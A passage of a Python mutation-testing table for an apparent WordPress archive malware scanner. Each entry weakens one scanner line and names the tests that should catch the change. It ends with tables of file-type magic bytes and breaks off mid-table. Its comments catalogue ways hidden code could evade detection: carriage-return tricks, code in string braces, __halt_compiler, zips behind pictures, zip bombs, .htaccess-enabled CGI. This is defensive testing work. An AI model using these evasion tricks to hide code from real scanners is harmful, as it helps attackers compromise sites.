    # these puts back one difference that hid a call from every rule.
    Mutation(
        "a lone carriage return does not end a line", LEXER,
        "const isLineBreak = (char) => char === '\\n' || char === '\\r';", "const isLineBreak = (char) => char === '\\n';",
        (
            launch_path("after_comment_ended_by_carriage_return"), launch_path("after_hash_comment_ended_by_carriage_return"),
            launch_path("after_heredoc_with_carriage_returns"),
        ),
    ),
    Mutation(
        "code in {$...} inside a string not read", LEXER,
        "(char === '{' && source[at + 1] === '$') || (char === '$' && source[at + 1] === '{')", "char === '$' && source[at + 1] === '{'",
        (launch_path("after_quote_in_string_braces"), launch_path("inside_string_braces"), launch_path("inside_heredoc_braces")),
    ),
    Mutation(
        "code in ${...} inside a string not read", LEXER,
        "(char === '{' && source[at + 1] === '$') || (char === '$' && source[at + 1] === '{')", "char === '{' && source[at + 1] === '$'",
        (launch_path("after_quote_in_dollar_braces"),),
    ),
    Mutation(
        "braces in a string counted without reading what is between them", LEXER,
        "  const end = lexCode(source, start, context);\n",
        "  let end = start;\n  for (let open = 1; open > 0 && end < source.length; end += 1) {\n"
        "    if (source[end] === '{') open += 1;\n    if (source[end] === '}') open -= 1;\n  }\n",
        (launch_path("after_brace_in_quotes_in_string"), launch_path("inside_string_braces")),
    ),
    Mutation(
        "__halt_compiler as a member name stops the reading", LEXER,
        "  if (before !== undefined && before.kind === 'symbol' && MEMBER_ACCESS.has(before.text)) return false;\n", "",
        (launch_path("after_halt_compiler_as_method"),),
    ),
    Mutation(
        "the word __halt_compiler alone stops the reading", LEXER,
        "if (!isEmbedded && isHaltStatement(source, at, tokens)) return source.length;",
        "if (tokens[tokens.length - 1].text.toLowerCase() === HALT_COMPILER) return source.length;",
        (launch_path("after_halt_compiler_as_property"), launch_path("after_halt_compiler_as_method")),
    ),
    Mutation(
        "a short tag that starts with xml skipped", LEXER,
        "    if (shortTags) return at + 2;\n",
        "    if (shortTags && source.slice(at + 2, at + 5).toLowerCase() !== 'xml') return at + 2;\n",
        (launch_path("after_xml_like_short_tag"),),
    ),
    Mutation(
        "carriage return kept at the end of a heredoc", LEXER,
        "isAfterCarriageReturn ? lineStart - 1 : lineStart", "lineStart",
        (launch_path("name_in_heredoc_with_windows_line_ends"),),
    ),
    Mutation(
        "unicode escape read only without leading zeros", LEXER,
        "const UNICODE_ESCAPE_REACH = 64;", "const UNICODE_ESCAPE_REACH = 6;",
        (launch_path("name_from_padded_unicode_escape"),),
    ),
    Mutation(
        "no limit to code nested in strings", LEXER,
        "  if (context.depth >= MAX_EMBEDDED_DEPTH) throw new CodeTooLargeError('nesting');\n", "",
        (sample("code_past_nesting_limit"),),
    ),
    # Which WordPress is the copy's own, and what counts as always-loaded code.
    Mutation(
        "the first version.php in the table taken for the site", ENGINE,
        "const versionEntry = shallowest(versionEntries);", "const versionEntry = versionEntries[0] ?? null;",
        (sample("second_wordpress_listed_first"),),
    ),
    Mutation(
        "a second WordPress not named", ENGINE,
        "  for (const otherRoot of site.otherRoots) reporter.report('scan.other_wordpress', otherRoot, {});\n", "",
        (sample("second_wordpress_listed_first"), sample("mu_plugin_of_second_wordpress")),
    ),
    Mutation(
        "always-loaded code known only at one depth", ENGINE,
        "\n  const contentAt = parts.findIndex((part) => part.toLowerCase() === CONTENT_FOLDER);",
        "\n  const contentAt = parts[1]?.toLowerCase() === CONTENT_FOLDER ? 1 : -1;",
        (sample("mu_plugin_of_second_wordpress"),),
    ),
    Mutation(
        "backslash not read as a folder separator", ENGINE,
        "const parts = path.replaceAll('\\\\', '/').split('/');", "const parts = path.split('/');",
        (sample("mu_plugin_named_with_backslashes"),),
    ),
    Mutation(
        "files of a second WordPress listed as loose PHP", ENGINE,
        "(deepest === null || folder.length > deepest.length)", "(deepest === null || folder.length < deepest.length)",
        (
            sample("second_wordpress_listed_first"),
            # The copy of wp-content in staging/ keeps its finding path; only its sentence tells.
            "test_page_report.py::test_loose_php_in_wp_content_is_not_said_to_lie_where_wordpress_loads_no_code",
        ),
    ),
    # Ways to a launch function that the rules did not know.
    switch_off("function import not read", PHP_RULES, "name === 'use' && functionName(next ?? {}) === 'function'", launch_path("imported_under_another_name")),
    Mutation(
        "namespace-relative name taken for another namespace", PHP_RULES,
        "written.startsWith(NAMESPACE_PREFIX) ? written.slice(NAMESPACE_PREFIX.length) : written", "written",
        (launch_path("namespace_relative_name"),),
    ),
    Mutation(
        "a list of one name taken for a lookup", PHP_RULES, " && isIndexed(tokens[index - 2])", "",
        (launch_path("name_in_list_of_one"), launch_path("name_in_returned_list_of_one")),
    ),
    switch_off("call of a list element not seen", PHP_RULES, "isSymbol(before, ']')", launch_path("element_of_list_called")),
    Mutation(
        "call of what a call returns not seen", PHP_RULES, "  return !isCast && !isCondition;", "  return false;",
        (launch_path("result_of_call_called"),),
    ),
    Mutation(
        "a cast taken for a call", PHP_RULES, "  return !isCast && !isCondition;", "  return !isCondition;",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "a condition taken for a call", PHP_RULES, "  return !isCast && !isCondition;", "  return !isCast;",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "a callback in a variable not seen", PHP_RULES, "(isBareVariable || callback === OUT_OF_REACH)", "(callback === OUT_OF_REACH)",
        (launch_path("callback_in_variable"), launch_path("callback_in_variable_second_argument")),
    ),
    Mutation(
        "a callback past the reach taken for a known one", PHP_RULES, "(isBareVariable || callback === OUT_OF_REACH)", "(isBareVariable)",
        (launch_path("callback_past_the_reach"),),
    ),
    Mutation(
        "guard file: a lone carriage return does not end a comment", "scanner/php-text.js",
        "text[at] !== '\\r' && ", "",
        (sample("uploads_guard_files"),),
    ),
    Mutation(
        "guard file: each comment searched to the end of the file", "scanner/php-text.js",
        "  while (at < text.length && text[at] !== '\\n' && text[at] !== '\\r' && !text.startsWith(CLOSE_TAG, at)) at += 1;\n  return at;",
        "  const ends = [text.indexOf('\\n', at), text.indexOf('\\r', at), text.indexOf(CLOSE_TAG, at)].filter((index) => index >= 0);\n"
        "  return ends.length === 0 ? text.length : Math.min(...ends);",
        ("test_code_limits.py::test_a_file_of_comments_does_not_hold_the_scan",),
    ),
    Mutation(
        "clock never read", LEXER,
        "if (steps % CLOCK_EVERY_STEPS === 0 && performance.now() > deadline) throw new CodeTimeLimitError();", "",
        ("test_code_limits.py::test_a_file_that_takes_too_long_is_named_and_the_scan_goes_on",),
    ),

    Mutation(
        "mu-plugins not always loaded", ENGINE,
        "  return inside.length === 2 && inside[0].toLowerCase() === MU_PLUGINS_FOLDER && inside[1].endsWith(MU_PLUGIN_ENDING);", "  return false;",
        (launch_path("exec"),),
    ),
    Mutation(
        "wp-config.php not always loaded", ENGINE,
        "  if (isSiteConfig(path)) return configFolders.has(folderOf(path));\n", "",
        (sample("site_config_runs_program"),),
    ),
    Mutation(
        "wp-config.php found in one letter case only", ENGINE,
        ".pop().toLowerCase() === CONFIG_FILE", ".pop() === CONFIG_FILE",
        (sample("config_above_the_core_runs_program"),),
    ),
    Mutation(
        "a file on the list counted as loose PHP", ENGINE,
        "const isListed = scope === 'loaded';", "const isListed = false;",
        (sample("config_above_the_core_runs_program"),),
    ),
    Mutation(
        "drop-ins not always loaded", ENGINE,
        "  if (inside.length === 1) return isDropIn(inside[0]);\n", "",
        (sample("drop_in_runs_program"),),
    ),
    Mutation(
        "official files read as code", ENGINE, "isCodeName(entry) && !verified.has(entry.name)", "isCodeName(entry)",
        (sample("official_code_is_not_judged"),),
    ),
    Mutation(
        "code in nested zips not read", ENGINE, "    await checkCode(nested, NOT_A_SITE, new Set());\n", "",
        (sample("code_inside_nested_zip"),),
    ),
    switch_off(
        "no size limit for code", ENGINE,
        "entry.uncompressedSize > CODE_FILE_LIMIT_BYTES",
        sample("code_past_size_limit"),
    ),
    # Always-loaded code that the reader gives up on is red; elsewhere it is not checked.
    Mutation(
        "always-loaded code past a limit only named as not checked", ENGINE,
        "  if (scope === 'loaded') {\n    reporter.report('loaded.code_not_read'", "  if (false) {\n    reporter.report('loaded.code_not_read'",
        (
            sample("code_past_size_limit"), sample("code_past_token_limit"), sample("code_past_nesting_limit"),
            sample("always_loaded_code_past_limits"), "test_code_limits.py::test_always_loaded_code_that_takes_too_long_is_red",
        ),
    ),
    Mutation(
        "every file past a limit red", ENGINE,
        "  if (scope === 'loaded') {\n    reporter.report('loaded.code_not_read'", "  if (true) {\n    reporter.report('loaded.code_not_read'",
        (
            sample("code_past_size_limit_outside_loaded_code"), sample("always_loaded_code_past_limits"),
            "test_code_limits.py::test_a_file_that_takes_too_long_is_named_and_the_scan_goes_on",
        ),
    ),
    Mutation(
        "a file too large to read judged as other code", ENGINE,
        "readCode(container, { entry, scope: isOnTheList ? 'loaded' : 'unproven' })", "readCode(container, { entry, scope: 'unproven' })",
        (sample("code_past_size_limit"),),
    ),
    Mutation(
        "a translation file past a limit taken for texts", ENGINE,
        "if (error instanceof CodeTooLargeError || error instanceof CodeTimeLimitError) return false;",
        "if (error instanceof CodeTooLargeError || error instanceof CodeTimeLimitError) return true;",
        (sample("always_loaded_code_past_limits"), "test_code_limits.py::test_always_loaded_code_past_a_limit_stays_listed_for_reading"),
    ),
    switch_off(
        "time limit named as a size limit", ENGINE, "reason === TIME_LIMIT_REASON",
        "test_code_limits.py::test_a_file_that_takes_too_long_is_named_and_the_scan_goes_on",
    ),
    # Always-loaded code with no bytes to read at all (encrypted, another method, damaged, no data).
    Mutation(
        "code that cannot be read kept out of the code reading", ENGINE,
        ".filter((entry) => isCodeName(entry) && !verified.has(entry.name))", ".filter((entry) => isCodeFile(entry) && !verified.has(entry.name))",
        (sample("always_loaded_code_never_read"),),
    ),
    Mutation(
        "always-loaded code that cannot be read only named by the zip checks", ENGINE,
        "  if (scope !== 'loaded') return;\n  reporter.report('loaded.code_not_read'", "  if (true) return;\n  reporter.report('loaded.code_not_read'",
        (sample("always_loaded_code_never_read"), "test_code_limits.py::test_always_loaded_code_never_read_names_why"),
    ),
    Mutation(
        "any code that cannot be read red", ENGINE,
        "  if (scope !== 'loaded') return;\n  reporter.report('loaded.code_not_read'", "  if (false) return;\n  reporter.report('loaded.code_not_read'",
        (sample("always_loaded_code_never_read"),),
    ),
    Mutation(
        "damaged or missing data of always-loaded code not red", ENGINE,
        "  reportLoadedUnreadable(container, { entry, scope }, failure);\n", "",
        (sample("always_loaded_code_never_read"),),
    ),
    Mutation(
        "encryption not named as the reason", ENGINE, "  if (entry.isEncrypted) return 'encrypted';\n", "",
        ("test_code_limits.py::test_always_loaded_code_never_read_names_why",),
    ),
    Mutation(
        "packing method not named as the reason", ENGINE, "  if (!isSupportedMethod(entry)) return 'method';\n", "",
        ("test_code_limits.py::test_always_loaded_code_never_read_names_why",),
    ),
    Mutation(
        "damage not named as the reason", ENGINE,
        "return failure === DAMAGED ? 'damaged' : 'unreachable';", "return 'unreachable';",
        ("test_code_limits.py::test_always_loaded_code_never_read_names_why",),
    ),
    Mutation(
        "the limit not named on the red finding", ENGINE,
        "'loaded.code_not_read', entry.name, { bytes: entry.uncompressedSize, reason }", "'loaded.code_not_read', entry.name, { bytes: entry.uncompressedSize }",
        (
            "test_code_limits.py::test_the_token_limit_is_named_as_such", "test_code_limits.py::test_the_nesting_limit_is_named_as_such",
            "test_code_limits.py::test_the_size_limit_is_named_as_such", "test_code_limits.py::test_always_loaded_code_that_takes_too_long_is_red",
        ),
    ),
    Mutation(
        "always-loaded files not listed", ENGINE,
        "    if (scope === 'loaded') {\n", "    if (false) {\n",
        ("test_code_limits.py::test_every_always_loaded_file_is_listed_for_reading",),
    ),

    # An include of a file not named like PHP.
    Mutation(
        "include of another file name not reported", PHP_RULES,
        "if (extension !== null) note('include_not_php'", "if (false) note('include_not_php'",
        (code_shape("include_of_other_extension"),),
    ),
    Mutation(
        "the pair rule named before the include's own file", CODE_RULES,
        "['include_not_php', 'include_uploads']", "['include_uploads', 'include_not_php']",
        (code_shape("include_of_other_extension"),),
    ),
    Mutation(
        "a closing tag does not end the statement", LEXER,
        "      if (!isEmbedded) tokens.push({ kind: 'symbol', text: ';', at });\n", "",
        (code_shape("include_in_brackets_ended_by_close_tag"),),
    ),
    Mutation(
        "grouping brackets around the path not peeled", PHP_RULES,
        "  while (last >= 0 && isSymbol(tokens[last], ')') && isGrouping(tokens, openers[last])) {", "  while (false) {",
        (code_shape("include_in_brackets_ended_by_close_tag"),),
    ),
    Mutation(
        # Three hundred thousand nested includes share one end; looked up for each, the brackets
        # in front of it are walked that many times and the file runs into its time limit.
        "the term before an end looked up for every include", PHP_RULES,
        "    if (!lastTerms.has(end)) lastTerms.set(end, lastTermBefore(file, end));\n",
        "    lastTerms.set(end, lastTermBefore(tokens, end, places.openers, tick));\n",
        ("test_code_limits.py::test_stall_baits_do_not_hold_the_scan",),
    ),
    Mutation(
        "the include's own bracket taken for a call", PHP_RULES,
        "if (before.kind === 'name') return INCLUDE_KEYWORDS.has(functionName(before));", "if (before.kind === 'name') return false;",
        (code_shape("include_in_brackets_ended_by_close_tag"),),
    ),
    Mutation(
        "a call's brackets taken for grouping", PHP_RULES,
        "if (before.kind === 'name') return INCLUDE_KEYWORDS.has(functionName(before));", "if (before.kind === 'name') return true;",
        (sample("quiet_includes_always_loaded"),),
    ),
    Mutation(
        "statement end at a semicolon not seen", PHP_RULES,
        "if (isCloser || token.text === ';' || token.text === ',') {", "if (isCloser || token.text === ',') {",
        (code_shape("include_of_other_extension"),),
    ),
    Mutation(
        "an include inside brackets ended by a semicolon outside them", PHP_RULES,
        "      while (open.length > 0 && open[open.length - 1].depth === depth) ends.set(open.pop().index, at);\n",
        "      while (open.length > 0) ends.set(open.pop().index, at);\n",
        (sample("quiet_includes_always_loaded"),),
    ),
    Mutation(
        "a method named include counted", PHP_RULES,
        " && isPlainCall(tokens, index) && !isSymbol(next, ':')", " && !isSymbol(next, ':')",
        (sample("quiet_includes_always_loaded"),),
    ),
    Mutation(
        "a named argument called require counted", PHP_RULES,
        " && isPlainCall(tokens, index) && !isSymbol(next, ':')", " && isPlainCall(tokens, index)",
        (sample("quiet_includes_always_loaded"),),
    ),
    Mutation(
        "PHP extensions reported as other files", PHP_RULES,
        "return PHP_EXTENSIONS.has(extension) ? null : extension", "return extension",
        (sample("quiet_includes_always_loaded"),),
    ),
    Mutation(
        "a variable after the dot taken for an extension", PHP_RULES,
        "  if (fileName.lastIndexOf(VARIABLE_MARK) > dot) return null;\n", "",
        (sample("quiet_includes_always_loaded"),),
    ),
    Mutation(
        "a file without an extension not reported", PHP_RULES,
        "if (dot < 0) return NO_EXTENSION;", "if (dot < 0) return null;",
        (code_shape("include_without_extension"),),
    ),
    Mutation(
        "extension sent at any length", PHP_RULES,
        "extension.slice(0, SHOWN_EXTENSION_LENGTH);", "extension;",
        ("test_samples.py::test_a_long_extension_is_named_by_its_first_characters",),
    ),

    # A bomb written to the decompressor whole, and packed data no declared size explains.
    Mutation(
        "packed data written to the decompressor in one piece", "scanner/inflate.js",
        "    for (let at = 0; at < compressed.length; at += FEED_SLICE_BYTES) {\n"
        "      await writer.write(compressed.subarray(at, at + FEED_SLICE_BYTES));\n"
        "    }\n",
        "    await writer.write(compressed);\n",
        ("test_inflate.py::test_a_bomb_is_fed_only_until_enough_came_out",),
    ),
    Mutation(
        "packed size held to zlib's default growth", "scanner/entries.js",
        "const PACKED_GROWTH_DIVISOR = 4;", "const PACKED_GROWTH_DIVISOR = 1024;",
        (sample("official_files_from_frugal_encoder"),),
    ),
    Mutation(
        "no allowance for the smallest files", "scanner/entries.js",
        "const PACKED_SLACK_BYTES = 64 * 1024;", "const PACKED_SLACK_BYTES = 0;",
        (sample("official_files_from_frugal_encoder"),),
    ),
    Mutation(
        "packed size not checked before reading", "scanner/entries.js",
        "  if (!isPackedSizePossible(entry)) return { bytes: null, failure: DAMAGED };\n", "",
        ("test_samples.py::test_packed_data_longer_than_possible_is_not_read",),
    ),
    # No mutation for the settings check's own "could not be read in full": in Chromium the
    # first-bytes reading always names an impossibly packed .htaccess first (see engine.js).
    # A zip behind a picture that the reader refuses before it looks for the table.
    switch_off(
        "refused zips behind pictures taken for chance", ENGINE,
        "REFUSED_BEFORE_TABLE.has(error.code) && await endRecordFindsTable(blob)",
        sample("crowded_zip_behind_picture"), sample("multi_part_zip_behind_picture"),
    ),
    Mutation(
        "any end record taken to find a table", READER,
        "return tableBeforeRecord || hasSignature(blob, end.directoryOffset, SIGNATURE_CENTRAL);", "return true;",
        (sample("lone_end_records_refused_behind_pictures"),),
    ),
    Mutation(
        "table right before the record not looked for", READER,
        "const tableBeforeRecord = await hasSignature(blob, end.structuresStart - end.directoryBytes, SIGNATURE_CENTRAL);",
        "const tableBeforeRecord = false;",
        (sample("crowded_zip_behind_picture"),),
    ),
    Mutation(
        "too many entries behind a picture taken for chance", ENGINE,
        "REFUSED_BEFORE_TABLE = new Set(['multi_disk', 'too_many_entries'])", "REFUSED_BEFORE_TABLE = new Set(['multi_disk'])",
        (sample("crowded_zip_behind_picture"),),
    ),
    Mutation(
        "several disks behind a picture taken for chance", ENGINE,
        "REFUSED_BEFORE_TABLE = new Set(['multi_disk', 'too_many_entries'])", "REFUSED_BEFORE_TABLE = new Set(['too_many_entries'])",
        (sample("multi_part_zip_behind_picture"),),
    ),
    # Small fixes, one mutation each.
    switch_off(
        "a head longer than the declared size passed over", ENGINE,
        "entry.method === METHOD_DEFLATE && content.length > entry.uncompressedSize",
        sample("media_longer_than_its_declared_head"),
    ),
    Mutation(
        "head read to exactly 4 KB", ENGINE,
        "(packed, HEAD_BYTES + 1);",
        "(packed, HEAD_BYTES);",
        (sample("media_longer_than_its_declared_head"),),
    ),
    Mutation(
        "code judged by its packed size", ENGINE,
        "  if (entry.uncompressedSize > CODE_FILE_LIMIT_BYTES) {\n",
        "  if (entry.uncompressedSize > CODE_FILE_LIMIT_BYTES || entry.compressedSize > CODE_FILE_LIMIT_BYTES) {\n",
        (sample("php_with_more_packed_data_than_it_declares"),),
    ),
    Mutation(
        "a file at the top of the archive named as its own folder", ENGINE,
        "logical.includes('/') ? `${logical.split('/')[0]}/` : TOP_OF_ARCHIVE", "`${logical.split('/')[0]}/`",
        (sample("php_outside_code_folders"),),
    ),
    Mutation(
        "first progress waits for the worker to age", ENGINE,
        "  let descriptorSlack = 0;\n  let lastProgress = -Infinity;", "  let descriptorSlack = 0;\n  let lastProgress = 0;",
        ("test_page_behaviour.py::test_the_first_progress_names_the_first_file",),
    ),
    Mutation(
        "an old scan's log writes into the new one", PAGE_VIEW,
        "    scheduled = false;\n    if (closed) return;\n", "    scheduled = false;\n",
        ("test_page_behaviour.py::test_a_new_scan_leaves_nothing_of_the_old_one_in_the_log",),
    ),
    Mutation(
        "the hosts taken as the site kept from the visitor", ENGINE,
        "a host of their own.\n  emit({ type: 'site_hosts', hosts: [...siteHosts].slice(0, LISTED_SITE_HOSTS) });\n", "a host of their own.\n",
        ("test_database.py::test_the_hosts_taken_as_the_site_are_shown",),
    ),
    Mutation(
        "a replaced scan's log left open", "scanner/main.js", "      finish(false);\n      log.close();\n", "      finish(false);\n",
        ("test_page_behaviour.py::test_a_new_scan_leaves_nothing_of_the_old_one_in_the_log",),
    ),
    Mutation(
        "a plugin without a version not asked whether it is closed", GATEWAY,
        "['checked', 'no_version', 'network', 'unavailable', 'bad_answer']", "['checked', 'network', 'unavailable', 'bad_answer']",
        ("test_advisories.py::test_a_closed_plugin_without_a_version_is_named",),
    ),
    Mutation(
        "a silent directory called a failed vulnerability lookup", GATEWAY,
        "  return { ...advisory, closureUnknown: directoryFailed && advisory.state === 'checked' };",
        "  return directoryFailed && advisory.state === 'checked' ? { ...advisory, state: entry.state } : advisory;",
        ("test_advisories.py::test_a_silent_directory_is_not_a_failed_vulnerability_lookup",),
    ),
    Mutation(
        "a heading counts vulnerabilities that were not looked up", "scanner/messages-en.js",
        "    if (record.state !== 'checked') return `${name}: known vulnerabilities not looked up`;\n", "",
        ("test_advisories.py::test_a_closed_plugin_without_a_version_is_named",),
    ),
    Mutation(
        "a source link opens in the report's tab", PAGE_VIEW, "    link.target = '_blank';\n", "",
        ("test_advisories.py::test_a_link_opens_beside_the_report",),
    ),
    Mutation(
        "links read with URL.canParse", ADVISORIES,
        "if (typeof link !== 'string' || link.length > MAX_LINK_LENGTH) return '';",
        "if (typeof link !== 'string' || link.length > MAX_LINK_LENGTH || !URL.canParse(link)) return '';",
        ("test_advisories.py::test_links_are_read_without_url_can_parse",),
    ),
    Mutation(
        "a .jse file not a program by name", SIGNATURES, "'.vbe', '.jse', ", "'.vbe', ",
        (sample("scripts_and_programs_by_place"), "test_rules_covered.py::test_programs_the_code_rules_know_are_programs_by_name_too"),
    ),
    # Scripts XAMPP's web server runs by itself.
    Mutation(
        "server scripts not named", ENGINE,
        "    if (SERVER_SCRIPT_EXTENSIONS.has(extension)) reporter.report(serverScriptRule(isNested, logicalName), name, { extension });\n", "",
        (sample("server_scripts_by_place"),),
    ),
    Mutation(
        "a .shtml file not a server script", SIGNATURES, "['.cgi', '.pl', '.asp', '.shtml']", "['.cgi', '.pl', '.asp']",
        (sample("server_scripts_by_place"),),
    ),
    Mutation(
        "a .asp file not a server script", SIGNATURES, "['.cgi', '.pl', '.asp', '.shtml']", "['.cgi', '.pl', '.shtml']",
        (sample("server_scripts_by_place"),),
    ),
    Mutation(
        "a server script red among code too", ENGINE,
        "return isInCodeFolder(logicalName) ? 'layout.server_script_in_code_folder' : 'layout.server_script';",
        "return 'layout.server_script';",
        (sample("server_scripts_by_place"),),
    ),
    Mutation(
        "a server script inside a zip judged like one in the copy", ENGINE,
        "  if (isNested) return 'layout.executable_in_archive';\n  return isInCodeFolder(logicalName) ? 'layout.server_script_in_code_folder'",
        "  return isInCodeFolder(logicalName) ? 'layout.server_script_in_code_folder'",
        (sample("server_scripts_by_place"),),
    ),
    # A file name longer than the page accepts in a message (2026-11-14).
    Mutation(
        "worker sends text of any length", "scanner/worker.js",
        "const emit = (event) => self.postMessage(shorten(event));", "const emit = (event) => self.postMessage(event);",
        (sample("name_longer_than_a_message_field"),),
    ),
    # A dump inside a zip found in the copy.
    Mutation(
        "a dump inside a nested zip passed over", ENGINE,
        "      if (!entry.isDirectory && isDatabaseDump(entry.name)) reporter.report('db.in_nested_archive', entry.name, { bytes: entry.uncompressedSize });\n",
        "",
        (sample("dump_inside_nested_zip"),),
    ),
    # Plugins past the 300 one scan compares.
    Mutation(
        "plugins past the limit not named", ENGINE,
        "  if (pastLimit.length > 0) {\n", "  if (false) {\n",
        (sample("plugins_past_limit"),),
    ),
    # A second archive inside the end record's comment.
    Mutation(
        "second archive in the comment not looked for", READER,
        "  if (holdsSecondArchive(view, at)) throw new ZipFormatError('ambiguous_end_record');\n", "",
        (sample("second_zip_in_comment"),),
    ),
    Mutation(
        "any record in the comment taken for an archive", READER,
        "if (tableStart >= 0 && view.getUint32(tableStart, true) === SIGNATURE_CENTRAL) return true;", "return true;",
        (sample("lone_end_record_in_comment"),),
    ),
    # CGI and server-side includes switched on by an .htaccess.
    Mutation(
        "CGI handlers not noted", CONFIG_RULES, "  if (name === CGI_HANDLER) runners.cgi ??= { what, line };\n", "",
        (sample("config_runs_programs"),),
    ),
    Mutation(
        "server-side include filters not noted", CONFIG_RULES, "  runners.ssi ??= { what, line };\n};", "};",
        (sample("config_runs_programs"),),
    ),
    Mutation(
        "ExecCGI switched off ignored", CONFIG_RULES,
        "if (runners.cgi && (runners.execCgi || runners.execCgiInSection))", "if (runners.cgi)",
        (sample("config_runs_programs"),),
    ),
    Mutation(
        "include commands switched off ignored", CONFIG_RULES,
        "if (runners.ssi && (runners.commandsInIncludes || runners.commandsInSection))", "if (runners.ssi)",
        (sample("config_runs_programs"),),
    ),
    Mutation(
        "a switch-off inside a section counted for the folder", CONFIG_RULES,
        "openSections > 0 ? readOptionsInSection : readOptions;", "readOptions;",
        (sample("config_runs_programs"),),
    ),
    Mutation(
        "a switch-on inside a section ignored", CONFIG_RULES,
        "  runners.execCgiInSection ||= change.execCgi === true;\n", "",
        (sample("config_runs_programs"),),
    ),
    Mutation(
        "sections never counted as closed", CONFIG_RULES,
        "    if (ANY_SECTION_CLOSE.test(line)) openSections = Math.max(0, openSections - 1);\n    else if (ANY_SECTION_OPEN.test(line)) openSections += 1;\n",
        "    if (ANY_SECTION_OPEN.test(line)) openSections += 1;\n",
        (sample("config_runs_programs"),),
    ),
    Mutation(
        "IncludesNOEXEC taken to allow commands", CONFIG_RULES,
        "    if (option === 'includesnoexec' && isOn) change.commandsInIncludes = false;\n", "",
        (sample("config_runs_programs"),),
    ),
    # .htaccess lines continued with a backslash.
    Mutation(
        "continued lines not joined", CONFIG_RULES,
        "    const continues = line.endsWith(", "    const continues = false && line.endsWith(",
        (sample("config_continued_lines"),),
    ),
    Mutation(
        "a comment joined to the line after it", CONFIG_RULES, "!(pieces.length === 0 && ", "!(false && ",
        (sample("config_continued_lines"),),
    ),
    Mutation(
        "the backslash kept in a joined line", CONFIG_RULES, "fitLine(continues ? line.slice(0, -1) : line,", "fitLine(line,",
        (sample("config_continued_lines"),),
    ),
    # Blank padding that pushes a directive past the cut.
    Mutation(
        "a long line cut without folding its blanks", CONFIG_RULES, "line.replace(/\\s+/g, ' ')", "line",
        (sample("config_padded_lines"),),
    ),
    Mutation(
        "a continued piece cut without folding its blanks", CONFIG_RULES,
        "fitLine(continues ? line.slice(0, -1) : line, Math.max(0, LINE_LIMIT - length))",
        "(continues ? line.slice(0, -1) : line).slice(0, Math.max(0, LINE_LIMIT - length))",
        (sample("config_padded_lines"),),
    ),
    # One large file read for longer than the page waits in silence.
    Mutation(
        "no heartbeat while hashing a large file", "scanner/entries.js",
        "      consume(step.value);\n      container.alive();\n", "      consume(step.value);\n",
        ("test_long_reads.py::test_both_long_reading_loops_say_they_are_alive",),
    ),
    Mutation(
        "no heartbeat while unpacking the end of a large file", "scanner/entries.js",
        "      while (keptBytes - kept[0].length >= tailBytes) keptBytes -= kept.shift().length;\n      container.alive();\n",
        "      while (keptBytes - kept[0].length >= tailBytes) keptBytes -= kept.shift().length;\n",
        (
            "test_long_reads.py::test_both_long_reading_loops_say_they_are_alive",
            "test_long_reads.py::test_one_long_read_does_not_end_the_scan",
        ),
    ),
    Mutation(
        "heartbeat never sent", ENGINE, "    emit({ type: 'alive' });\n", "",
        ("test_long_reads.py::test_one_long_read_does_not_end_the_scan",),
    ),
    Mutation(
        "page refuses the heartbeat", "scanner/protocol.js", "  ['alive', () => ({ type: 'alive' })],\n", "",
        ("test_long_reads.py::test_one_long_read_does_not_end_the_scan",),
    ),
    Mutation(
        "unreadable file of a known size passed over", ENGINE,
        "      if (failure === DAMAGED) container.reporter.report('entry.corrupt_data', entry.name, { reason: 'indicator' });\n", "",
        ("test_indicators.py::test_a_file_of_the_known_size_that_cannot_be_unpacked_is_named",),
    ),
]


SIGNATURE_ROWS = {
    "windows_program": "  { kind: 'windows_program', offset: 0, bytes: [0x4d, 0x5a] },\n",
    "linux_program": "  { kind: 'linux_program', offset: 0, bytes: [0x7f, 0x45, 0x4c, 0x46] },\n",
    "script": "  { kind: 'script', offset: 0, bytes: [0x23, 0x21] },\n",
    "java_or_macos_program": "  { kind: 'java_or_macos_program', offset: 0, bytes: [0xca, 0xfe, 0xba, 0xbe] },\n",
    "macos_program": "  { kind: 'macos_program', offset: 0, bytes: [0xcf, 0xfa, 0xed, 0xfe] },\n",
    "windows_shortcut": "  { kind: 'windows_shortcut', offset: 0, bytes: [0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00] },\n",
    "zip": "  { kind: 'zip', offset: 0, bytes: [0x50, 0x4b, 0x03, 0x04] },\n",
    "zip_empty": "  { kind: 'zip_empty', offset: 0, bytes: [0x50, 0x4b, 0x05, 0x06] },\n",
    "zip_spanned": "  { kind: 'zip_spanned', offset: 0, bytes: [0x50, 0x4b, 0x07, 0x08] },\n",
    "sevenzip": "  { kind: 'sevenzip', offset: 0, bytes: [0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c] },\n",
    "rar": "  { kind: 'rar', offset: 0, bytes: [0x52, 0x61, 0x72, 0x21, 0x1a, 0x07] },\n",
    "gzip": "  { kind: 'gzip', offset: 0, bytes: [0x1f, 0x8b] },\n",
    "bzip2": "  { kind: 'bzip2', offset: 0, bytes: [0x42, 0x5a, 0x68] },\n",
    "xz": "  { kind: 'xz', offset: 0, bytes: [0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00] },\n",
    "zstd": "  { kind: 'zstd', offset: 0, bytes: [0x28, 0xb5, 0x2f, 0xfd] },\n",
    "cab": "  { kind: 'cab', offset: 0, bytes: [0x4d, 0x53, 0x43, 0x46] },\n",
    "tar": "  { kind: 'tar', offset: 257, bytes: [0x75, 0x73, 0x74, 0x61, 0x72] },\n",
}

IMAGE_ROWS = {
    "jpeg": "  { kind: 'jpeg', offset: 0, bytes: [0xff, 0xd8, 0xff] },\n",
    "png": "  { kind: 'png', offset: 0, bytes: [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a] },\n",
    "gif": "  { kind: 'gif', offset: 0, bytes: [0x47, 0x49, 0x46, 0x38] },\n",
    "webp": "  { kind: 'webp', offset: 8, bytes: [0x57, 0x45, 0x42, 0x50] },\n",
    "bmp": "  { kind: 'bmp', offset: 0, bytes: [0x42, 0x4d] },\n",
    "icon": "  { kind: 'icon', offset: 0, bytes: [0x00, 0x00, 0x01, 0x00] },\n",
    "cursor": "  { kind: 'cursor', offset: 0, bytes: [0x00, 0x00, 0x02, 0x00] },\n",
    "tiff_intel": "  { kind: 'tiff_intel', offset: 0, bytes: [0x49, 0x49, 0x2a, 0x00] },\n",
